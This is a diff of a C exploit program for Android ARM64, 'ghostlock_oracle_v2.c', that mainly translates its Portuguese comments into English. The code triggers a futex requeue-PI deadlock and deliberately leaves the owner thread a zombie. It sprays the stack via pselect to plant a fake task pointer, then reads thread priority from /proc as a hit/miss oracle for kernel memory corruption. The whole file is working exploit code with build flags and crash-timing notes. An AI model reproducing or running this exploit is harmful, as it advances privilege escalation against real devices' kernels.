@@ -1,17 +1,17 @@
 /*
- * ghostlock_oracle_v2.c — GhostLock/aquaman, oraculo por valor (1 trial proc).
+ * ghostlock_oracle_v2.c — GhostLock/aquaman, value oracle (1 trial proc).
  *
- * Um trial por execucao. Uso:
- *   ghostlock_oracle_v2 nostamp          (i) controle, sem carimbo
- *   ghostlock_oracle_v2 stamp 0x120      (ii)/(iii) carimbo + fake
+ * One trial per execution. Usage:
+ *   ghostlock_oracle_v2 nostamp          (i) control, no stamp
+ *   ghostlock_oracle_v2 stamp 0x120      (ii)/(iii) stamp + fake
  *
- * Fluxo: waiter trava f_chain, pendura em FWRQ (f_wait -> f_target, timeout
- * 5s); owner trava f_target e deadlocka em f_chain; main faz CMP_REQUEUE_PI
- * e exige EDEADLK (errno 35) senao aborta. Leitor le /proc/<waiter>/stat f18
- * (priority = prio-100) e f19 (nice, controle) ANTES; main acorda o waiter
- * (FUPI f_target ou timeout), waiter carimba e dorme 60s vivo; consumer faz
- * pthread_setschedparam(BATCH) no waiter; leitor le f18/f19 DEPOIS.
- * Intacto: f18 20/20. Hit: f18 -100, f19 0.
+ * Flow: waiter locks f_chain, hangs on FWRQ (f_wait -> f_target, timeout 5s);
+ * owner locks f_target and deadlocks on f_chain; main executes CMP_REQUEUE_PI
+ * and requires EDEADLK (errno 35) or aborts. Reader reads /proc/<waiter>/stat f18
+ * (priority = prio-100) and f19 (nice, control) BEFORE; main wakes the waiter
+ * (FUPI f_target or timeout), waiter stamps and sleeps 60s alive; consumer executes
+ * pthread_setschedparam(BATCH) on waiter; reader reads f18/f19 AFTER.
+ * Intact: f18 20/20. Hit: f18 -100, f19 0.
  *
  * Build (NDK r29, ARM64, API 28):
  *   aarch64-linux-android28-clang -O2 -Wall -Wextra -static \
@@ -52,7 +52,7 @@
 #define FWRQ (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
 #define FCRQ (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
 
-#define NWORDS (3 * GL_PSEL_SIZE / 8)   /* 3 fd_sets de 40B = 15 u64 */
+#define NWORDS (3 * GL_PSEL_SIZE / 8)   /* 3 fd_sets of 40B = 15 u64 */
 
 static uint32_t f_wait, f_target, f_chain;
 static volatile int w_ready, w_waiting, w_done, o_started, o_exited;
@@ -77,7 +77,7 @@ static uint64_t now_ns(void) {
     return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
 }
 
-/* pselect com pattern controlado. nfds=320 => size 0x28, fica no stack. */
+/* pselect with controlled pattern. nfds=320 => size 0x28, stays on stack. */
 __attribute__((noinline)) static void psel_with(const uint64_t *w) {
     const fd_set *s0 = (const fd_set *)(w + 0);
     const fd_set *s1 = (const fd_set *)(w + 5);
@@ -89,11 +89,10 @@ __attribute__((noinline)) static void psel_with(const uint64_t *w) {
 }
 
 /*
- * stamp_at: VLA dimensionado pelo pad em runtime. O compilador nao tem como
- * saber o tamanho no prologo: emite sub sp,sp,Xn dinamico, entao o pselect
- * la dentro roda com SP deslocado de pad. Touch a cada 64B + barrier: o VLA
- * nao pode sumir nem virar memset de tamanho variavel sobre frame fixo
- * (esse era o bug do stamper antigo: vla[4096] fixo + memset(len)).
+ * stamp_at: VLA dimensioned by runtime pad. The compiler cannot know size
+ * in prologue: emits dynamic sub sp,sp,Xn, so inner pselect runs with SP shifted by pad.
+ * Touch every 64B + barrier: VLA cannot be optimized out or turned into variable memset
+ * over fixed frame.
  */
 __attribute__((noinline)) static void stamp_at(uint64_t pad,
                                                const uint64_t *w) {
@@ -110,21 +109,21 @@ __attribute__((noinline)) static void stamp_at(uint64_t pad,
     __asm__ volatile("" :: "r"(vla) : "memory");
 }
 
-/* Profundo primeiro, raso (pad-0x78) depois. SPs 0x78 apart, provado. */
+/* Deep first, shallow (pad-0x78) second. SPs 0x78 apart. */
 __attribute__((noinline)) static void stamp(uint64_t pad) {
     stamp_at(pad, deep_words);
     stamp_at(pad > GL_PSEL_SLOT3_OFF ? pad - GL_PSEL_SLOT3_OFF : 16,
              shallow_words);
 }
 
-/* pin CPU0: tira migracao da janela de crash, o resto do projeto faz igual */
+/* pin CPU0: removes migration from crash window */
 static void pin_cpu0(void) {
     cpu_set_t m;
 
     CPU_ZERO(&m);
     CPU_SET(0, &m);
     if (sched_setaffinity(0, sizeof(m), &m))
-        printf("[warn] affinity errno=%d (segue sem pin)\n", errno);
+        printf("[warn] affinity errno=%d (proceeding without pin)\n", errno);
 }
 
 static void *waiter_fn(void *u) {
@@ -138,20 +137,20 @@ static void *waiter_fn(void *u) {
     while (!o_started)
         usleep(1000);
     {
-        /* acorda por TIMEOUT proprio. main nao toca em nenhum futex do trio:
-         * unlock de fora corre com o timeout na mesma wait tree. */
+        /* wakes on own TIMEOUT. main does not touch trio futexes:
+         * external unlock races with timeout in same wait tree. */
         struct timespec ts;
         clock_gettime(CLOCK_MONOTONIC, &ts);
         ts.tv_sec += 2;
         w_waiting = 1;
         xfutex(&f_wait, FWRQ, 0, &ts, &f_target, 0);
     }
-    xfutex(&f_chain, FUPI, 0, NULL, NULL, 0);   /* owner sai do deadlock */
+    xfutex(&f_chain, FUPI, 0, NULL, NULL, 0);   /* owner leaves deadlock */
     w_done = 1;
     if (g_stamp_mode)
         stamp(g_pad);
     stamped = 1;
-    sleep(60);   /* vivo p/ o consumer; exit do main nos mata antes */
+    sleep(60);   /* kept alive for consumer; main exit terminates process */
     return NULL;
 }
 
@@ -166,13 +165,13 @@ static void *owner_fn(void *u) {
     while (!w_ready)
         usleep(1000);
     o_started = 1;
-    xfutex(&f_chain, FLPI, 0, NULL, NULL, 0);   /* deadlock por design */
+    xfutex(&f_chain, FLPI, 0, NULL, NULL, 0);   /* deadlock by design */
     o_exited = 1;
-    return NULL;   /* NAO joined: vira zumbi de proposito, ver main() */
+    return NULL;   /* NOT joined: kept as zombie intentionally, see main() */
 }
 
-/* heartbeat: localiza a morte. parou no meio do settle = morte assincrona;
- * parou depois de [consumer-before] = o walk do consumer. */
+/* heartbeat: locates crash timing. Stopped mid-settle = async crash;
+ * stopped after [consumer-before] = consumer walk crash. */
 static void *heartbeat_fn(void *u) {
     uint64_t t0;
     (void)u;
@@ -206,7 +205,7 @@ static int read_stat(int tid, int *prio, int *nice) {
         char *rp = strrchr(buf, ')');
         if (!rp)
             return -1;
-        /* f3..f19: state + 14 suprimidos + priority + nice */
+        /* f3..f19: state + 14 suppressed + priority + nice */
         if (sscanf(rp + 1, " %c %*d %*d %*d %*d %*d %*u %*u %*u %*u %*u"
                    " %*lu %*lu %*ld %*ld %d %d", &st, &p, &v) != 3)
             return -1;
@@ -220,8 +219,7 @@ static void *reader_fn(void *u) {
     int spins = 0;
     (void)u;
 
-    /* so o post-read. o pre-read era codigo novo na janela do crash e o
-     * parser ja esta provado pelo trial 1 (f18=20 f19=0). */
+    /* post-read only. pre-read is proven by trial 1 (f18=20 f19=0). */
     while (!consumer_done && spins++ < 900)
         usleep(10000);
     if (!consumer_done)
@@ -250,12 +248,12 @@ int main(int argc, char **argv) {
     pin_cpu0();
     if (argc < 2 || (strcmp(argv[1], "nostamp") &&
                      strcmp(argv[1], "stamp"))) {
-        printf("uso: %s nostamp | stamp <pad_hex> [hold]\n", argv[0]);
+        printf("usage: %s nostamp | stamp <pad_hex> [hold]\n", argv[0]);
         return 3;
     }
     g_stamp_mode = !strcmp(argv[1], "stamp");
     g_pad = (argc > 2) ? strtoull(argv[2], NULL, 0) : 0;
-    /* hold em qualquer posicao depois do modo: nostamp hold / stamp 0x120 hold */
+    /* hold anywhere after mode: nostamp hold / stamp 0x120 hold */
     g_hold = (argc > 2 && !strcmp(argv[2], "hold")) ||
              (argc > 3 && !strcmp(argv[3], "hold"));
 
@@ -267,18 +265,18 @@ int main(int argc, char **argv) {
         fake_page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
         if (fake_page == MAP_FAILED) {
-            printf("[setup] mmap falhou\n");
+            printf("[setup] mmap failed\n");
             return 3;
         }
         if (mlock(fake_page, 4096)) {
-            printf("[setup] mlock falhou errno=%d\n", errno);
+            printf("[setup] mlock failed errno=%d\n", errno);
             return 3;
         }
         memset(fake_page, 0, 4096);
         *(volatile uint32_t *)((char *)fake_page + GL_TASK_PRIO) = 0;
         for (i = 0; i < NWORDS; i++)
             deep_words[i] = shallow_words[i] = GL_PAGE_OFFSET;
-        /* waiter->task cai no byte B do span; B<0x78 vai no deep */
+        /* waiter->task falls on byte B of span; B<0x78 goes to deep */
         if (b < GL_PSEL_SPAN && !(b & 7)) {
             if (b < GL_PSEL_SLOT3_OFF)
                 deep_words[b / 8] = (uint64_t)(uintptr_t)fake_page;
@@ -290,7 +288,7 @@ int main(int argc, char **argv) {
                (unsigned long long)g_pad, fake_page,
                (unsigned long long)b);
     } else {
-        printf("[info] mode=nostamp (controle, sem carimbo)\n");
+        printf("[info] mode=nostamp (control, no stamp)\n");
     }
 
     f_wait = f_target = f_chain = 0;
@@ -298,7 +296,7 @@ int main(int argc, char **argv) {
         pthread_create(&o, NULL, owner_fn, NULL) ||
         pthread_create(&r, NULL, reader_fn, NULL) ||
         pthread_create(&hb, NULL, heartbeat_fn, NULL)) {
-        printf("[setup] pthread_create falhou\n");
+        printf("[setup] pthread_create failed\n");
         return 3;
     }
 
@@ -306,7 +304,7 @@ int main(int argc, char **argv) {
     while ((!w_waiting || !o_started) && spins++ < 1500)
         usleep(10000);
     if (!w_waiting || !o_started) {
-        printf("[abort] waiter/owner nao penduraram\n");
+        printf("[abort] waiter/owner failed to wait\n");
         return 2;
     }
     usleep(300000);
@@ -314,42 +312,36 @@ int main(int argc, char **argv) {
     errno = 0;
     xfutex(&f_wait, FCRQ, 1, (void *)(uintptr_t)1, &f_target, 0);
     if (errno != EDEADLK) {
-        printf("[abort] cmp errno=%d, esperado 35. sem EDEADLK, sem trial.\n",
+        printf("[abort] cmp errno=%d, expected 35. no EDEADLK, no trial.\n",
                errno);
         return 2;
     }
     printf("[cmp] errno=35 EDEADLK ok, tid_waiter=%d\n", waiter_sys_tid);
 
-    /* main nao destrava mais nada: o waiter acorda pelo proprio timeout (2s),
-     * solta a chain e o owner sai. nada aqui compete na wait tree. */
+    /* main unlocks nothing further: waiter wakes on timeout (2s),
+     * releases chain and owner exits. */
     if (wait_flag(&w_done, 15)) {
-        printf("[abort] waiter nao acordou pelo timeout\n");
+        printf("[abort] waiter did not wake on timeout\n");
         return 2;
     }
-    printf("[teardown] waiter acordou e soltou a chain\n");
+    printf("[teardown] waiter woke and released chain\n");
 
-    /* SEM pthread_join(owner) de proposito.
-     * O owner fica ZUMBI: task_struct e kernel stack dele continuam mapeados,
-     * e o rt_mutex_waiter dele (no do owner na wait tree do f_chain) segue
-     * valido. Com join, o reaping libera essa memoria e o walk do consumer
-     * (__sched_setscheduler -> adjust_pi) pisa em heap freed. Foi
-     * exatamente o crash do gate v2. */
+    /* NO pthread_join(owner) by design.
+     * Owner remains zombie: task_struct and kernel stack remain mapped,
+     * and its rt_mutex_waiter node in wait tree remains valid. */
     if (wait_flag(&o_exited, 15)) {
-        printf("[abort] owner nao saiu do deadlock\n");
+        printf("[abort] owner did not leave deadlock\n");
         return 2;
     }
-    printf("[teardown] owner virou zumbi (nao joined), task_struct vivo\n");
+    printf("[teardown] owner became zombie (not joined), task_struct alive\n");
 
     if (wait_flag(&stamped, 12)) {
-        printf("[abort] waiter nao carimbou a tempo\n");
+        printf("[abort] waiter did not stamp in time\n");
         return 2;
     }
-    printf("[teardown] carimbo feito, settle 250ms com heartbeat\n");
+    printf("[teardown] stamp done, settle 250ms with heartbeat\n");
 
     hb_go = 1;
-    /* 2.5s -> 250ms: o ator assincrono mata entre +2000 e +2500ms do settle
-     * (4 boots, mesmo ponto). o consumer tem que rodar antes disso, senao o
-     * f18_post nao existe. */
     usleep(250000);
     printf("[teardown] settle finished\n");
 
@@ -360,25 +352,23 @@ int main(int argc, char **argv) {
     dt = now_ns() - t0;
     printf("[consumer-after] rc=%d errno=%d us=%llu %s\n", rc, errno,
            (unsigned long long)dt / 1000,
-           dt > 1000000ULL ? "STALL" : "rapido");
+           dt > 1000000ULL ? "STALL" : "fast");
     hb_stop = g_hold ? 0 : 1;
     consumer_done = 1;
 
     if (wait_flag(&post_done, 15)) {
-        printf("[abort] leitor nao leu o post\n");
+        printf("[abort] reader failed to read post\n");
         return 2;
     }
     printf("[result] pad=%#llx f18_post=%d f19=%d %s survived=1\n",
            (unsigned long long)g_pad, f18_post, f19_post,
-           f18_post == -100 ? "HIT" : (f18_post == 20 ? "MISS" : "ESQUISITO"));
+           f18_post == -100 ? "HIT" : (f18_post == 20 ? "MISS" : "ANOMALY"));
 
-    /* hold: o processo NAO sai nunca, logo exit_pi_state do main nunca roda.
-     * se o device morrer mesmo assim, o exit nao era o ator (e a gente
-     * queimou um boot provando isso, obviously). */
+    /* hold: process never exits, so main exit_pi_state never runs. */
     if (g_hold) {
-        printf("[hold] entrou, processo nao vai sair\n");
+        printf("[hold] entered, process will not exit\n");
         for (;;) {
-            printf("[hold] vivo\n");
+            printf("[hold] alive\n");
             usleep(500000);
         }
     }
